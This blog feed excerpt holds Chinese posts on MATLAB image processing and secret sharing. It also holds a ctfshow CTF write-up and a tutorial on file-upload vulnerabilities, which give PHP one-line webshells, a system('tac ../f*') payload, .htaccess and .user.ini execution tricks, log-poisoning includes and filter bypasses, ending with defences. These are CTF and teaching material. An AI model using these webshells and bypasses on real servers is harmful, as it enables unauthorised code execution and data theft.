class="string">&#x27;Correlation Result&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/CorrelationResult.png" alt="CorrelationResult"></p><p>可以看到，<strong>轮胎中心的白色非常明显，说明相关值很高</strong></p><p>接下来我们框出这些轮胎，并输出它们的坐标</p><p>首先设置一个相关性阈值，找出超过该阈值的点</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">threshold = <span class="number">0.9</span>; </span><br><span class="line">[y, x] = <span class="built_in">find</span>(correlation_matrix &gt; threshold);</span><br></pre></td></tr></table></figure><p>然后框出并展示匹配图像和坐标</p><p>值得注意的是，如果边缘存在高相关值点，<strong>很可能对原图求子图的索引会越界</strong>，所以我们选择<strong>将原图放在一个大的白色背景中</strong></p><p>得到匹配结果如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/coordinatets.png" alt="coordinatets"></p><p>我们可以发现匹配结果会给出<strong>距离十分接近但其实同属一个轮胎的点</strong></p><p>解决办法就是进行判断，<strong>选择其中相关值高的点</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">values = correlation_matrix(correlation_matrix &gt; threshold); <span class="comment">% 获取相关值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 创建一个新的列表用于存储最终点</span></span><br><span class="line">final_x = [];</span><br><span class="line">final_y = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">% 进行点之间的比较</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="built_in">length</span>(x)</span><br><span class="line">    keep = <span class="built_in">true</span>;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">j</span> = <span class="number">1</span>:<span class="built_in">length</span>(x)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">i</span> ~= <span class="built_in">j</span></span><br><span class="line">            dist = <span class="built_in">sqrt</span>((x(<span class="built_in">i</span>) - x(<span class="built_in">j</span>))^<span class="number">2</span> + (y(<span class="built_in">i</span>) - y(<span class="built_in">j</span>))^<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> dist &lt; <span class="built_in">max</span>(wheelWidth, wheelHeight) &amp;&amp; values(<span class="built_in">i</span>) &lt; values(<span class="built_in">j</span>)</span><br><span class="line">                keep = <span class="built_in">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> keep</span><br><span class="line">        final_x = [final_x x(<span class="built_in">i</span>)];</span><br><span class="line">        final_y = [final_y y(<span class="built_in">i</span>)];</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 使用final_x和final_y代替原来的x和y</span></span><br><span class="line">x = final_x;</span><br><span class="line">y = final_y;</span><br></pre></td></tr></table></figure><p>这样进行一次判断后，匹配结果也变得正常，只是可能因为算法原因，还是无法识别最右边的轮胎</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/coordinatets-16998105692293.png" alt="coordinatets"></p><h1 id="HW2-椒盐噪声与中值滤波"><a href="#HW2-椒盐噪声与中值滤波" class="headerlink" title="HW2 椒盐噪声与中值滤波"></a>HW2 椒盐噪声与中值滤波</h1><p>作业要求：</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113112512939.png" alt="image-20231113112512939"></p><p>原图<code>sport car.pgm</code>如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113112604424.png" alt="image-20231113112604424"></p><p>由于是灰度图，我们考虑<strong>使用普通的中值滤波算法</strong>，即寻找窗口内的中间值</p><p>首先我们需要产生随机的椒盐噪声</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t1 = rand(size_of_image);</span><br><span class="line">t2 = rand(size_of_image);</span><br><span class="line"></span><br><span class="line">t1 = uint8(t1 * <span class="number">255</span>);</span><br><span class="line">t2 = uint8(t2 * <span class="number">255</span>);</span><br></pre></td></tr></table></figure><p>通过MATLAB中的<code>rand()</code>函数，我们可以生成0到1的随机矩阵，接着我们将其缩放到[0,255]的范围</p><p>接着我们在原图像上<strong>应用椒盐噪声</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x = <span class="number">1</span>:<span class="built_in">size</span>(f0, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> y = <span class="number">1</span>:<span class="built_in">size</span>(f0, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> f0(x,y) &gt; t1(x,y)</span><br><span class="line">            f(x,y) = <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">elseif</span> f0(x,y) &lt; t2(x,y)</span><br><span class="line">            f(x,y) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            f(x,y) = f0(x,y);</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>接着使用中值滤波进行去噪</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f1 = f; </span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">2</span>:<span class="built_in">size</span>(f0, <span class="number">1</span>)<span class="number">-1</span>  </span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">j</span>=<span class="number">2</span>:<span class="built_in">size</span>(f0, <span class="number">2</span>)<span class="number">-1</span></span><br><span class="line">        window = f(<span class="built_in">i</span><span class="number">-1</span>:<span class="built_in">i</span>+<span class="number">1</span>,<span class="built_in">j</span><span class="number">-1</span>:<span class="built_in">j</span>+<span class="number">1</span>);</span><br><span class="line">        window = window(:);</span><br><span class="line">        s=<span class="built_in">sort</span>(window); <span class="comment">%对像素进行排序</span></span><br><span class="line">        f1(<span class="built_in">i</span>,<span class="built_in">j</span>) = s(<span class="built_in">floor</span>(<span class="built_in">length</span>(window)/<span class="number">2</span>)+<span class="number">1</span>); <span class="comment">%选取中值</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">f1 = uint8(f1);</span><br></pre></td></tr></table></figure><p>下面直接第哦啊有medfilt2函数生成f2</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f2 = medfilt2(f, [<span class="number">3</span>,<span class="number">3</span>]);</span><br><span class="line">f2 = uint8(f2);</span><br></pre></td></tr></table></figure><p>最后我们将所有图像放在一起对比</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/result.png" alt="result"></p><p>可以看到<strong>中值滤波去噪的效果还不错</strong>，而我们<strong>自己实现的中值滤波与medfilt2基本一致</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> MATLAB </tag>
            
            <tag> Digital Image Processing </tag>
            
            <tag> project </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow 文件上传模块</title>
      <link href="/posts/ad095ca75f58/"/>
      <url>/posts/ad095ca75f58/</url>
      
        <content type="html"><![CDATA[<h2 id="web151（客户端校验）"><a href="#web151（客户端校验）" class="headerlink" title="web151（客户端校验）"></a>web151（客户端校验）</h2><p>右键查看源代码</p><img src="/posts/ad095ca75f58/image-20240512164332028.png" class="" title="image-20240512164332028"><p>这是典型的JS验证，即使用客户端校验</p><p>我们直接在元素中，修改上传按钮标签中传递的文件后缀参数，改为php</p><img src="/posts/ad095ca75f58/image-20240512164701157.png" class="" title="image-20240512164701157"><p>此时再上传一个php一句话木马即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;R1ck&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用蚁剑连接</p><img src="/posts/ad095ca75f58/image-20240512165233537.png" class="" title="image-20240512165233537"><p>得到flag</p><img src="/posts/ad095ca75f58/image-20240512165304245.png" class="" title="image-20240512165304245"><h2 id="web152（MIME校验）"><a href="#web152（MIME校验）" class="headerlink" title="web152（MIME校验）"></a>web152（MIME校验）</h2><p>本题源码与上一题一致，但是无法直接修改前端代码来绕过</p><p>观察到响应数据包中存在Content-Type字段，猜测使用了MIME校验</p><p>上传一句话木马后使用burpsuite抓包，修改Content-Type字段的值为<code>image/png</code>即可</p><h2 id="web153（-user-ini）"><a href="#web153（-user-ini）" class="headerlink" title="web153（.user.ini）"></a>web153（.user.ini）</h2><p>尝试上一题的MIME校验绕过思路，发现无法绕过</p><p>抓包发现本题使用的是nginx服务器</p><img src="/posts/ad095ca75f58/image-20240512194050131.png" class="" title="image-20240512194050131"><p>尝试使用.user.ini绕过</p><p>上传<code>ini.png</code>文件，内容如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=hack.png</span><br></pre></td></tr></table></figure><p>抓包后将其名字改为<code>.user.ini</code></p><img src="/posts/ad095ca75f58/image-20240512200147731.png" class="" title="image-20240512200147731"><p>接下来再修改前端，使其接收png文件，将木马上传</p><img src="/posts/ad095ca75f58/image-20240512200714727.png" class="" title="image-20240512200714727"><h2 id="web154（过滤-lt-php）"><a href="#web154（过滤-lt-php）" class="headerlink" title="web154（过滤&lt;?php）"></a>web154（过滤<code>&lt;?php</code>）</h2><p>本关尝试上传<code>hack.png</code>时报错，而普通png图片可以成功上传，说明服务端对上传文件的内容有检测</p><p>我们使用二分更改一句话木马，判断一下过滤了什么部分</p><img src="/posts/ad095ca75f58/image-20240512202116599.png" class="" title="image-20240512202116599"><p>去掉前半部分，发现上传正常</p><p>去掉<code>&lt;?php</code>，上传正常，去掉<code>eval</code>，上传失败</p><p>去掉<code>&lt;?</code>，上传正常，去掉<code>php</code>，上传正常</p><p>说明过滤了<code>&lt;?php</code></p><div class="note info flat"><p>在PHP中，代码必须被包含在特定的标记（tags）中以指明哪些部分应被解释为PHP代码，下面是5种常用的标记</p><ol><li><p>标准PHP标记</p><p>这是最常见的PHP代码标记，也是推荐使用的标记，适用于所有的PHP文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpCopy code<span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>短标记</p><p>短标记更简洁，但需要在php.ini文件中开启 <code>short_open_tag</code> 配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">// PHP代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>输出标记（Echo短标记）</p><p>在 PHP 中，<code>&lt;?= ?&gt;</code> 是一个简写形式的 <code>echo</code> 语句，它用于输出一段表达式的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="string">&quot;Hello, world!&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种标记无需 <code>short_open_tag</code> 配置即可使用，因为从PHP 5.4.0起，它已经默认被PHP支持。</p></li><li><p>脚本标记</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line"><span class="comment">// PHP代码</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这种标记没有额外的配置要求</p></li><li><p>ASP风格标记</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>PHP 5.3</strong>：从PHP 5.3开始，这种ASP风格的标记默认被禁用。它们可以通过在php.ini文件中设置 <code>asp_tags</code> 为 <code>On</code> 来启用，但这通常不推荐。</li><li><strong>PHP 7.0</strong>：在PHP 7.0及更高版本中，支持 <code>&lt;% %&gt;</code> 标记的 <code>asp_tags</code> 配置选项被完全移除，这意味着ASP风格的标记不再被任何支持。</li></ul></li></ol></div><p>本题替换成<code>&lt;?=</code>即可</p><h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>本题解法与上一题一致</p><h2 id="web156（过滤中括号）"><a href="#web156（过滤中括号）" class="headerlink" title="web156（过滤中括号）"></a>web156（过滤中括号）</h2><img src="/posts/ad095ca75f58/image-20240512211455252.png" class="" title="image-20240512211455252"><p>本关使用输出标记时仍然无法上传</p><p>用二分法定位过滤部分</p><p>去掉后半部分后上传成功</p><p>去掉<code>&#39;])?&gt;</code>后上传失败，去掉<code>[&#39;R1ck</code>后上传成功</p><p>发现是中括号<code>[]</code>被过滤，我们使用大括号<code>&#123;&#125;</code>代替</p><p>一句话木马变为<code>&lt;?=eval($_POST&#123;&#39;R1ck&#39;&#125;)?&gt;</code></p><h3 id="web157（过滤中括号、大括号和分号）"><a href="#web157（过滤中括号、大括号和分号）" class="headerlink" title="web157（过滤中括号、大括号和分号）"></a>web157（过滤中括号、大括号和分号）</h3><p>二分法发现方括号和大括号和分号都被过滤</p><p>尝试直接执行命令而不是获得webshell </p><p>将木马文件中内容改为<code>&lt;?=system(&#39;tac ../f*&#39;)?&gt;</code></p><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>与上一题相同</p><h2 id="web159（过滤所有括号与分号）"><a href="#web159（过滤所有括号与分号）" class="headerlink" title="web159（过滤所有括号与分号）"></a>web159（过滤所有括号与分号）</h2><p>本题将小括号也过滤了，所以我们无法使用<code>system</code>等函数</p><p>用反引号代替</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">echo</span> `tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web160（过滤反引号）"><a href="#web160（过滤反引号）" class="headerlink" title="web160（过滤反引号）"></a>web160（过滤反引号）</h2><p>本关将反引号也过滤了，无法进行命令执行</p><p>考虑使用文件包含的方法绕过</p><p>我们可以将后门代码注入到UA头中，这样包含后门代码的请求头会被记录在日志文件中，从而用<code>include</code>函数包含日志文件中的后门代码并执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用拼接是由于log关键字也被服务端过滤</p><h2 id="web161（文件头检测）"><a href="#web161（文件头检测）" class="headerlink" title="web161（文件头检测）"></a>web161（文件头检测）</h2><p>本题在上一题的基础上加上幻术头<code>GIF89a</code>即可</p><h2 id="web162（）"><a href="#web162（）" class="headerlink" title="web162（）"></a>web162（）</h2>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/posts/e97ca1a52d81/"/>
      <url>/posts/e97ca1a52d81/</url>
      
        <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://wiki.wgpsec.org/knowledge/web/fileuploads.html">文件上传漏洞 | 狼组安全团队公开知识库 (wgpsec.org)</a></p><h2 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h2><p>最简单的校验方法即在客户端浏览器对上传的文件进行校验</p><p>我们可以将木马修改为允许的后缀，然后使用bp拦包修改后缀名</p><p>当然也可以直接修改客户端代码的逻辑，以允许上传php文件</p><h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><h3 id="MIME校验-文件内容头校验-GIF89a"><a href="#MIME校验-文件内容头校验-GIF89a" class="headerlink" title="MIME校验/文件内容头校验(GIF89a)"></a>MIME校验/文件内容头校验(GIF89a)</h3><div class="note info flat"><p><strong>MIME类型</strong>是用来标识文件的格式，确保数据能够正确地被互联网应用程序理解和处理</p><p>MIME类型通常在HTTP请求和响应中使用两个主要的HTTP头部字段<code>Content-Type</code> 和 <code>Accept</code>来传输，字段值决定了传输的文件类型</p><p>例如：</p><ul><li><code>text/html</code>：HTML文档</li><li><code>application/json</code>：JSON格式的数据</li><li><code>image/jpeg</code>：JPEG图像</li></ul></div><p>遇到MIME校验时，我们可以在上传php文件后抓包，修改<code>Content-Type</code> 的值为允许的类型</p><p>针对文件内容头校验，可以在恶意脚本前添加GIF89a标识，一句话前后加图片数据混淆</p><h3 id="文件扩展名校验"><a href="#文件扩展名校验" class="headerlink" title="文件扩展名校验"></a>文件扩展名校验</h3><p>一般检查文件扩展名时会使用黑名单或白名单来限制文件后缀</p><h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><ol><li><p>找漏网之鱼：<code>cer、php3、php4</code>等</p></li><li><p>大小写绕过：<code>AsP、pHP</code></p></li></ol><p>文件后缀复写绕过：<code>.phphpp</code></p><p>针对Windows系统：</p><p>上传不符合windows文件命名规则的文件名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.php:1.jpg</span><br><span class="line">test.php::$DATA</span><br></pre></td></tr></table></figure><p>会被windows系统自动去掉不符合规则符号后面的内容</p><p>会被windows系统自动去掉不符合规则符号后面的内容</p><h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><blockquote><p>%00截断 (PHP&lt;5.3.4时 shell.php%00.jpg 可截断%00后的内容) 配合服务器中间件解析漏洞绕过</p></blockquote><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><div class="note info flat"><p><code>.htaccess</code> 文件是Apache HTTP Server（以及一些兼容Apache的Web服务器，如LiteSpeed）特有的配置文件。它允许在不需要访问主服务器配置文件的情况下，对单个目录及其子目录应用特定的配置规则。</p></div><p>如果目标服务器允许用户修改.htaccess文件我们就可以通过它改变文件拓展名或者访问功能来getshell</p><p>如果可上传修改 <code>.htaccess</code> 文件 (还能用于隐藏后门)</p><p>例如下面的配置会将特定文件按php解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;shell.jpg&quot;</span>&gt;</span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">//上传shell.jpg文件，将解析为php运行</span></span><br></pre></td></tr></table></figure><p>当然我们也可以针对一类后缀，如<code>.png</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png   <span class="comment">//png文件解析为php文件</span></span><br></pre></td></tr></table></figure><h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><div class="note info flat"><p><code>.user.ini</code> 文件用于PHP应用，是自PHP 5.3.0版本引入的一种配置文件，可以在运行时改变PHP的配置设置。这些文件只影响其所在目录及子目录中的PHP文件。</p></div><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=a.jpg //在页面顶部加载文件</span><br><span class="line"><span class="attr">auto_append_file</span>=a.jpg  //在页面底部加载文件</span><br></pre></td></tr></table></figure><p><code>auto_prepend_file</code> 和 <code>auto_append_file</code>用于自动地在每个PHP脚本执行前后包含指定的PHP文件，即使该文件不是php后缀，也会执行其中的PHP代码</p><h3 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><p>一种情况是对文件内容中某些关键字进行过滤</p><p>我们可以使用<strong>二分法</strong>来判断过滤了一句话木马中的哪些部分</p><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>文件内容加<strong>幻术头</strong>GIF89a</p><h4 id="图像检测"><a href="#图像检测" class="headerlink" title="图像检测"></a>图像检测</h4><p>常见的是对图像进行二次渲染，一般是调用PHP 的GD库</p><p>我们可以使用绕过GD库的webshell生成器</p><p>例如getimagesize()函数，它是php提供的，通过对目标文件的16进制进行读取，通过该文件的前面几个字符串，来判断文件类型。</p><p>要绕过该函数的检测，我们可以伪造图片的16进制头部字符串，当然更简单的方法是将图片和php文件合成为一个图片</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy test.jpg + test.php synth.jpg</span><br></pre></td></tr></table></figure><h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h3><p>一些网站允许上传任意文件，然后检测文件是否包含Webshell，如果有则删除该文件。</p><blockquote><p>服务器端在处理不同用户的请求时是并发进行的</p><p>如果并发处理不当或相关操作逻辑顺序设计的不合理时，将导致条件竞争漏洞</p></blockquote><p>如这样一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">      <span class="title function_ invoke__">sleep</span>(<span class="number">2</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>它先把文件保存在本地，再检查，然后删除</p><p>在上传完成和安全检查删除它的间隙，攻击者用多线程不断的发起访问请求该文件</p><p>该文件就会被执行从而生成一个恶意shell</p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、使用白名单限制可以上传的文件扩展名</p><p>2、注意0x00截断攻击（PHP更新到最新版本）</p><p>3、对上传后的文件统一随机命名，不允许用户控制扩展名</p><p>4、上传文件的存储目录禁用执行权限</p>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向图像的秘密共享算法设计</title>
      <link href="/posts/0742023ea0bf/"/>
      <url>/posts/0742023ea0bf/</url>
      
        <content type="html"><![CDATA[<h2 id="门限秘密共享"><a href="#门限秘密共享" class="headerlink" title="门限秘密共享"></a>门限秘密共享</h2><p>现在应用广泛的的秘密共享主要框架即<strong>门限秘密共享</strong></p><div class="note info flat"><p>门限秘密共享的工作原理如下：</p><ol><li>秘密分割：首先，一个秘密信息被分割成多个部分，通常是通过一些数学算法进行划分。这些部分称为“份额”（shares）或“部分秘密”（partial secrets）。</li><li>门限条件：定义一个<strong>门限值（threshold）</strong>，只有在满足门限值要求的份额数量或者特定的份额组合之下，才能还原出原始的秘密信息。这个门限值可以是任何数字，通常是一个预先确定的整数。</li><li>分发份额：将这些份额分发给不同的参与者，每个参与者只持有其中的一部分份额，而且不知道其他参与者持有的份额内容。</li><li>重构秘密：当需要还原秘密信息时，至少要达到门限值数量的参与者合作，将他们的份额组合在一起，才能成功还原出原始的秘密。</li></ol></div><p>比较常见的门限秘密共享方案基本都是基于数学问题</p><h3 id="Shamir秘密共享方案"><a href="#Shamir秘密共享方案" class="headerlink" title="Shamir秘密共享方案"></a>Shamir秘密共享方案</h3><p>Shamir密码共享方案建立在一条数学定理上：</p><p><strong>n次平面代数曲线（一次时为直线），至少需要知道该曲线上的n+1个点的坐标</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231108105415508.png" alt="image-20231108105415508"></p><p>当需要恢复秘密时，我们需要用到<strong>拉格朗日插值公式</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231108111933113.png" alt="image-20231108111933113"></p><h3 id="基于中国剩余定理的秘密共享"><a href="#基于中国剩余定理的秘密共享" class="headerlink" title="基于中国剩余定理的秘密共享"></a>基于中国剩余定理的秘密共享</h3><p>顾名思义，该方案是基于<strong>中国剩余定理</strong></p><div class="note info flat"><p><strong>中国剩余定理(CRT)</strong>是数论中的一个定理，描述了一组线性同余方程的解的存在性和唯一性。具体来说，如果有一组两两互质的正整数$ n_1, n_2, …, n_k $，以及任意整数$ a_1, a_2, …, a_k $，则下面的一组同余方程：</p><script type="math/tex; mode=display">\begin{align*}x &\equiv a_1 \pmod{n_1} \\x &\equiv a_2 \pmod{n_2} \\&\vdots \\x &\equiv a_k \pmod{n_k}\end{align*}</script><p>存在一个唯一解$ x $，在模$N = n_1n_2…n_k $的意义下唯一。CRT提供了一种算法来找到这个唯一解。</p></div><p>基于CRT的秘密共享步骤如下：</p><ol><li><p><strong>选择互质的模数</strong>：<br>选取$ k $个大的、两两互质的正整数$ n_1, n_2, …, n_k $，它们的乘积要大于秘密数$ S $。</p></li><li><p><strong>分配秘密</strong>：<br>对于秘密$ S $，选择$ k $个整数$ a_1, a_2, …, a_k $，使得$ a_i \equiv S \pmod{n_i} $。这里每个$ a_i $就是秘密的一个“份额”。</p></li><li><p><strong>分发份额</strong>：<br>将每个$ a_i $和对应的模数$ n_i $作为一个份额，分发给参与者。每个参与者只能得到一个$ a_i $和$ n_i $。</p></li><li><p><strong>秘密恢复</strong>：<br>当需要恢复秘密$ S $时，收集足够数量的份额$ (a_i, n_i) $对。只要收集到的份额数目大于或等于原来分割的份额数目，就可以利用CRT计算出原始的秘密$ S $。</p></li><li><p><strong>利用CRT计算原秘密</strong>：<br>为了恢复秘密，首先计算所有模数的乘积$ N = n_1n_2…n_k $。然后，对于每个份额$ (a_i, n_i) $，计算$ N_i = N / n_i $和$ N_i $的模$ n_i $逆元$ m_i $，即$ m_iN_i \equiv 1 \pmod{n_i} $。最后，利用下面的公式计算$ x $：</p><script type="math/tex; mode=display">x = \sum_{i=1}^{k}(a_i \cdot m_i \cdot N_i) \pmod{N}</script><p>这个$ x $在模$ N $下等同于原始的秘密$ S $。</p></li></ol><h3 id="Brickell秘密共享"><a href="#Brickell秘密共享" class="headerlink" title="Brickell秘密共享"></a>Brickell秘密共享</h3><p>该方案是<strong>Shamir秘密共享方案的推广</strong>，由一维方程转向多维向量</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231108113909194.png" alt="image-20231108113909194"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231108113950970.png" alt="image-20231108113950970"></p><h2 id="面向图像的秘密共享"><a 